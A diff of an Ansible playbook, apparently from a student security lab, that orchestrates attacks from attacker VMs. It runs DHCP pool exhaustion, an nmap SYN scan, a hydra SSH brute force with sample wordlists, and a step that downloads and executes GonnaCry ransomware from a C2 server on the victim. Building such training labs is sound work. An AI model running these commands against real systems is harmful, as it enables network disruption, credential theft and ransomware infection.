@@ -49,119 +49,125 @@
           -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
           -W %h:%p admin@{{ (vms | selectattr('name','equalto','gateway1') | first).wan_ip }}"
 
-# ── DHCP Exhaustion ──────────────────────────────────────────
-- name: "Attack: DHCP pool exhaustion"
+# ── Play 2: Execute the chosen attack on attacker VM ────────
+- name: Execute attack
   hosts: attackers
   gather_facts: false
   become: true
-  when: hostvars['localhost']['attack_type'] == 'dhcp_exhaustion'
+  vars:
+    attack_type: "{{ hostvars['localhost']['attack_type'] }}"
+    victim_ip: "{{ hostvars['localhost']['victim_ip'] }}"
+    student_id: "{{ hostvars['localhost']['student_id'] }}"
   tasks:
-    - name: Run DHCP exhaustion
+    # ─── DHCP Exhaustion ───────────────────────────────
+    - name: "DHCP Exhaustion: Run attack"
       shell: python3 /home/student/attacks/dhcp_exhaustion.py --iface enp1s0 --timeout 3 --max 60
-      register: result
+      register: dhcp_result
       timeout: 300
       ignore_errors: true
-    - name: Output
+      when: attack_type == 'dhcp_exhaustion'
+
+    - name: "DHCP Exhaustion: Show output"
       debug:
-        msg: "{{ result.stdout_lines | default(['No output']) }}"
-    - name: Wait for lease flush
+        msg: "{{ dhcp_result.stdout_lines | default(['No output']) }}"
+      when: attack_type == 'dhcp_exhaustion' and dhcp_result is defined
+
+    - name: "DHCP Exhaustion: Wait for lease flush"
       pause:
         seconds: 30
+      when: attack_type == 'dhcp_exhaustion'
 
-# ── GonnaCry Ransomware ──────────────────────────────────────
-- name: "Attack: GonnaCry ransomware"
-  hosts: victims
-  gather_facts: false
-  when: hostvars['localhost']['attack_type'] == 'gonnacry'
-  tasks:
-    - name: Check C2 reachable
-      shell: curl -s --connect-timeout 10 http://173.168.0.50/ > /dev/null 2>&1
-      register: c2_check
-      ignore_errors: true
-    - name: Fail if C2 down
-      fail:
-        msg: "C2 server (173.168.0.50) unreachable. Run configure_c2.yml first."
-      when: c2_check.rc != 0
-    - name: Download and execute GonnaCry
-      shell: >
-        curl -s http://173.168.0.50/download-gonnacry/ -o /tmp/gonnacry
-        && chmod +x /tmp/gonnacry
-        && /tmp/gonnacry
-      register: result
-      timeout: 180
-      ignore_errors: true
-    - name: Output
-      debug:
-        msg: "{{ result.stdout_lines | default(['No output']) }}"
-    - name: Wait for encryption
-      pause:
-        seconds: 120
-        prompt: "Waiting 2 min for AES-256-GCM file encryption..."
-    - name: Check ransom note
-      shell: cat ~/RANSOM_NOTE.txt 2>/dev/null || echo 'No ransom note found'
-      register: ransom
-    - name: Show ransom note
-      debug:
-        msg: "{{ ransom.stdout_lines }}"
-
-# ── Nmap Scan ────────────────────────────────────────────────
-- name: "Attack: Nmap reconnaissance"
-  hosts: attackers
-  gather_facts: false
-  become: true
-  when: hostvars['localhost']['attack_type'] == 'nmap_scan'
-  tasks:
-    - name: Install nmap
+    # ─── Nmap Scan ─────────────────────────────────────
+    - name: "Nmap: Install"
       apt:
         name: nmap
         state: present
       ignore_errors: true
-    - name: Run SYN scan
+      when: attack_type == 'nmap_scan'
+
+    - name: "Nmap: Run SYN scan"
       shell: nmap -sS -T4 -p 22,53,67,68,80,443,445,3306 10.10.10.0/24 10.10.20.0/24 -oN /tmp/nmap_results.txt 2>&1
-      register: result
+      register: nmap_result
       timeout: 300
       ignore_errors: true
-    - name: Output
-      debug:
-        msg: "{{ result.stdout_lines | default(['No output']) }}"
+      when: attack_type == 'nmap_scan'
 
-# ── SSH Brute Force ──────────────────────────────────────────
-- name: "Attack: SSH brute force"
-  hosts: attackers
-  gather_facts: false
-  become: true
-  when: hostvars['localhost']['attack_type'] == 'ssh_brute_force'
-  vars:
-    victim_ip: "{{ hostvars['localhost']['victim_ip'] }}"
-  tasks:
-    - name: Install hydra
+    - name: "Nmap: Show results"
+      debug:
+        msg: "{{ nmap_result.stdout_lines | default(['No output']) }}"
+      when: attack_type == 'nmap_scan' and nmap_result is defined
+
+    # ─── SSH Brute Force ───────────────────────────────
+    - name: "Hydra: Install"
       apt:
         name: hydra
         state: present
       ignore_errors: true
-    - name: Create wordlists
+      when: attack_type == 'ssh_brute_force'
+
+    - name: "Hydra: Create wordlists"
       shell: |
         printf 'admin\nroot\nstudent\nubuntu\nuser\n' > /tmp/users.txt
         printf 'admin\npassword\n123456\nstudent\nubuntu\nletmein\ntoor\n' > /tmp/passes.txt
-    - name: Run hydra
+      when: attack_type == 'ssh_brute_force'
+
+    - name: "Hydra: Run brute force"
       shell: hydra -L /tmp/users.txt -P /tmp/passes.txt -t 4 -f -o /tmp/hydra_results.txt ssh://{{ victim_ip }} 2>&1
-      register: result
+      register: hydra_result
       timeout: 300
       ignore_errors: true
-    - name: Output
-      debug:
-        msg: "{{ result.stdout_lines | default(['No output']) }}"
+      when: attack_type == 'ssh_brute_force'
 
-# ── Summary ──────────────────────────────────────────────────
-- name: Attack complete
-  hosts: localhost
-  gather_facts: true
-  tasks:
-    - name: Summary
+    - name: "Hydra: Show results"
       debug:
-        msg: |
-          ════════════════════════════════════════════════
-          Attack complete: {{ attack_type }}
-          Student: {{ student_id }}
-          Logs will be collected in the next step.
-          ════════════════════════════════════════════════
+        msg: "{{ hydra_result.stdout_lines | default(['No output']) }}"
+      when: attack_type == 'ssh_brute_force' and hydra_result is defined
+
+    # ─── Summary ───────────────────────────────────────
+    - name: Attack summary
+      debug:
+        msg: "Attack '{{ attack_type }}' complete for student {{ student_id }}. Logs next."
+
+# ── Play 3: GonnaCry (runs on victim, not attacker) ─────────
+- name: Execute GonnaCry on victim
+  hosts: victims
+  gather_facts: false
+  vars:
+    attack_type: "{{ hostvars['localhost']['attack_type'] }}"
+  tasks:
+    - name: "GonnaCry: Check C2"
+      shell: curl -s --connect-timeout 10 http://173.168.0.50/ > /dev/null 2>&1
+      register: c2_check
+      ignore_errors: true
+      when: attack_type == 'gonnacry'
+
+    - name: "GonnaCry: Fail if C2 down"
+      fail:
+        msg: "C2 server (173.168.0.50) unreachable. Run configure_c2.yml first."
+      when: attack_type == 'gonnacry' and c2_check.rc != 0
+
+    - name: "GonnaCry: Download and execute ransomware"
+      shell: >
+        curl -s http://173.168.0.50/download-gonnacry/ -o /tmp/gonnacry
+        && chmod +x /tmp/gonnacry
+        && /tmp/gonnacry
+      register: gonnacry_result
+      timeout: 180
+      ignore_errors: true
+      when: attack_type == 'gonnacry'
+
+    - name: "GonnaCry: Wait for encryption"
+      pause:
+        seconds: 120
+        prompt: "Waiting 2 min for file encryption..."
+      when: attack_type == 'gonnacry'
+
+    - name: "GonnaCry: Check ransom note"
+      shell: cat ~/RANSOM_NOTE.txt 2>/dev/null || echo 'No ransom note found'
+      register: ransom
+      when: attack_type == 'gonnacry'
+
+    - name: "GonnaCry: Show ransom note"
+      debug:
+        msg: "{{ ransom.stdout_lines | default(['No output']) }}"
+      when: attack_type == 'gonnacry' and ransom is defined
